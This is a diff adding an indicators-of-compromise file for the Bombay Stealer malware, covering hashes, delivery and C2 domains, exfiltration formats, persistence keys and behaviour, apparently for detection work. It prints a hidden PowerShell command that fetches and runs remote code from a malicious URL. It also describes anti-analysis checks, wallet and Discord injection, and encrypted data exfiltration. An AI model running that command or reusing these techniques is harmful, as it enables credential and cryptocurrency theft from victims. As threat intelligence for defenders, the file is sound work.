@@ -1,0 +1,167 @@
+===============================================================================
+ BOMBAY STEALER - INDICATORS OF COMPROMISE (IOCs)
+ Chain: Discord DM -> DLL dropper -> PS loader -> HTA/VBS -> ZIP -> rename.exe
+ Stub version: 1.2.2 | Analysis: static RE (IDA Pro 9.2), 2026-11-13
+===============================================================================
+
+-------------------------------------------------------------------------------
+[1] FILE HASHES - STAGE 5 CORE (rename.exe)
+-------------------------------------------------------------------------------
+sha256    8eb3d4e293fc6894afef2ee3d4056a473491b39fcd4dbe91a495e60c9311bc6f
+md5       736439bb3ff646e805806b1ec1559396
+imphash   96c988111beae19d6f75f54b89a75585
+authentihash (sha256, unsigned blob)
+          b282f7864297f6e6085f1f85dfbe23656a4b1a1bbbecf260ace5572d5474328a
+size      3322880 bytes (0x32B400)
+note      seen in the wild as both rename.exe and WindowsUpdate.exe
+          (VT first submission 2026-11-12 22:25:37 UTC under name WindowsUpdate.exe)
+
+-------------------------------------------------------------------------------
+[2] FILE HASHES - SIDECAR / PACKAGE
+-------------------------------------------------------------------------------
+.spread_meta sha256
+          00d5e92b07819128e61a22f51a3c6f7d0352010596268fe0463468fcd74a2f3f
+.spread_meta size 68 bytes
+ZIP wrapper sha256 (one observed sample; hash churns per request -
+only .spread_meta entry mtime changes)
+          990c69218837eeb0683f8cd5d7b5bc6f0cbf10dffa0f9391945c77c864014f2
+ZIP member CRC32 (stable across rebuilds - use for build identification)
+          rename.exe   crc32 0xE1D90BA4  (size 3322880)
+          .spread_meta crc32 0x83C805EF  (size 68)
+
+-------------------------------------------------------------------------------
+[3] NETWORK INDICATORS - DELIVERY CHAIN
+-------------------------------------------------------------------------------
+domain    lumma.cy
+domain    tools.lumma.cy
+url       https://tools.lumma.cy/cT8I9?-k=U
+          stage 1/2 panel dispatcher; content UA-gated
+          (browser-UA -> off-screen HTA; powershell-UA branch unverified)
+url       https://tools.lumma.cy/Br6oAs_cpwZht4JoZ_NJ.png
+          stage 4 payload: ZIP masquerading as PNG; content UA-independent;
+          served with no UTF-8 BOM; re-zipped per request (mtime churn only)
+note      PHP server; plain GET; no auth tokens observed at any stage
+
+-------------------------------------------------------------------------------
+[4] NETWORK INDICATORS - STAGE 5 C2 / EXFIL
+-------------------------------------------------------------------------------
+domain    doxbin.cy
+url       https://doxbin.cy:2083
+          hardcoded default backend (compile-time constant); HTTPS on
+          port 2083; TLS certificate validation DISABLED
+          (WinHttpSetOption SECURITY_FLAGS=0x3100: ignore CN/date/unknown-CA)
+http-header
+          X-License-Key: C307-ABE1-D50C-B96A
+          (default license key of this build; sent on /init and upload;
+          spoofed UA used: Mozilla/5.0 (Windows NT 10.0; Win64; x64))
+http-endpoint-pattern
+          POST https://doxbin.cy:2083/?action=upload&type=<type>&unique_id=<id>
+          body: data=<base64(IV||AES-256-CBC)>,
+          Content-Type: application/x-www-form-urlencoded
+          observed type value: log_batch (plus per-item loot types)
+request-body-params
+          computer_name=, username=, os_version=, vm_detected=,
+          stub_version=1.2.2, spread_campaign_id=, spread_slug=,
+          spread_niche=, run_source=spread
+websocket C2 channel over WinHTTP WebSocket upgrade to doxbin.cy:2083:
+          {"type":"hello","token":...} auth; ping/pong keepalive;
+          thread-per-command file-manager RAT
+          (list_drives, list_dir, delete_path, file_rename, file_mkdir, data)
+
+-------------------------------------------------------------------------------
+[5] CAMPAIGN / ATTRIBUTION ARTIFACTS
+-------------------------------------------------------------------------------
+license-key
+          C307-ABE1-D50C-B96A
+          (builder-patched .data blob at RVA 0x311048, 'X'-padded to 0x40;
+          default key shipped in this build; also AES key source:
+          key = SHA-256(X-License-Key value))
+spread-meta
+          {"campaign_id":1933,"slug":"dll/73f20eb078d334d8","niche":"spotify"}
+campaign_id  1933
+slug         dll/73f20eb078d334d8
+niche        spotify (Discord lure theme)
+stub_version 1.2.2
+build time   2026-10-15 21:42:30 UTC (real link time from POGO debug entry;
+             header TimeDateStamp forged to 2024-12-30 05:57:42 UTC)
+toolchain    MSVC 19.50 / VS2026, static CRT, nlohmann::json 3.12.0,
+             SQLite amalgamation, custom ASAR library
+
+-------------------------------------------------------------------------------
+[6] FILESYSTEM INDICATORS
+-------------------------------------------------------------------------------
+filepath  %TEMP%\<random-11-lowercase-alnum>\rename.exe
+filepath  %TEMP%\<random-11-lowercase-alnum>\.spread_meta
+filename  .spread_meta (68-byte JSON sidecar, read relative to exe dir)
+filepath  %LOCALAPPDATA%\WindowsRecovery\Update.exe
+          (persistence drop; staged as Update.exe.tmp then swapped;
+          FILE_ATTRIBUTE_HIDDEN)
+observed  %TEMP%\Ze3C3ZQjwgb7dYLJVJ9e.vbs
+observed  %TEMP%\XMjZNwhV6AQ3o.vbs
+          (PHP-randomized VBS stub filenames in %TEMP%, executed via wscript.exe)
+artifact  off-screen 0x0 HTA at -30000,-30000 ("System Utility",
+          decoy body "<!-- Error 404 -->")
+marker    BND! / VER!
+          (ASCII overlay markers bounding appended binder payload in
+          infected EXEs and in the stub's self-image)
+file-mod  infected user-folder EXEs (Desktop/Downloads/Documents): icons
+          stripped/replaced (Begin/Update/EndUpdateResourceW), payload
+          appended between BND!/VER!, original launched via "--binder-child"
+resource  version info masquerade: WindowsUpdate.exe /
+          "Microsoft Software Update" 1.0.0.0 (unsigned)
+
+-------------------------------------------------------------------------------
+[7] REGISTRY INDICATORS (PERSISTENCE)
+-------------------------------------------------------------------------------
+regkey    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+regvalue  WindowsRecovery = "%LOCALAPPDATA%\WindowsRecovery\Update.exe"
+          (written via dynamically resolved advapi32 - no RegSetValueEx in IAT)
+
+-------------------------------------------------------------------------------
+[8] BEHAVIORAL / EXECUTION INDICATORS
+-------------------------------------------------------------------------------
+commandline
+          powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "irm 'https://tools.lumma.cy/cT8I9?-k=U' | iex"
+commandline
+          powershell.exe -W Hidden -EncodedCommand <base64 UTF-16LE>
+commandline
+          wscript.exe %TEMP%\<random>.vbs (hidden)
+commandline
+          <infected.exe> --binder-child   (binder child mode of stub)
+mutex     unnamed/runtime-generated single-instance mutex; takeover via
+          named event (OpenEventA+SetEvent wake, 40 x 150 ms retry)
+pipe      named pipe, message-mode duplex, 1 instance, name derived from
+          browser exe path - Chrome elevation_service impersonation for
+          App-Bound Encryption (ABE) master-key capture
+process   anti-analysis: terminates 178 RE/DFIR tools by name and by full
+          image path (ida/ida64/idaq/idaq64, ghidra, x64dbg, x32dbg,
+          wireshark, procmon/procexp/processhacker/systeminformer,
+          dnspy, frida, cheatengine, pestudio, hxd, upx, cuckoo,
+          fakenet, volatility, ... full breakdown in README.md / BombayStealer.md)
+anti-vm   CPUID 0x40000000 hypervisor vendor (VMware/VBox/KVM/Microsoft Hv),
+          BIOS-vendor whitelist (alaska/AMI/award/phoenix/insyde/lenovo),
+          read-only checks on HKLM\SOFTWARE\VMware, Inc.\VMware Tools,
+          HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions,
+          HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters,
+          SystemBiosVersion strings (vbox/vmware/virtual/qemu),
+          vmtoolsd.exe/vmwaretray.exe/VBoxService.exe/VBoxTray.exe,
+          drivers\VBoxGuest.sys / vmhgfs.sys / vmmouse.sys
+syscall   copy-pasted direct-syscall engine from xaitax ABE repo (PEB walk,
+          djb2 Zw* hashes, 'syscall;ret' gadgets, 23 Zw slots incl. 3 unused
+          hollowing slots) with GetProcAddress fallback
+inject    Exodus wallet: app.asar patched (CSP meta stripped from
+          src/static/wallet.html; "ignore-certificate-errors" added and
+          original Exodus domain allowlist widened to "*" in
+          src/app/main/index.js; Object(o.randomFill) hooked in
+          src/app/wallet/index.js for deterministic seeds; .bak kept)
+inject    Discord client: index.js patched with backend-fetched injection
+          code via direct-syscall file writes
+exfil     loot packed as Electron-style ASAR archive, AES-256-CBC with
+          key=SHA-256(license), IV prefixed, base64, POST data= parameter
+features  server-side toggles observed: exe_replacer, exodus_inject,
+          discord_inject, discord_grabber, bip39, chrome, screenshot,
+          systeminfo, extensions, wallets, keywords, telegram,
+          desktop_apps, firefox, vs_projects, remote_desktop;
+          hwid_blocked / vm_blocked = server-side victim kill switches
+worm      Discord DM self-propagation using victim account (reads /init
+          messages; backend kill switch) - re-seeds the Stage 0 lure
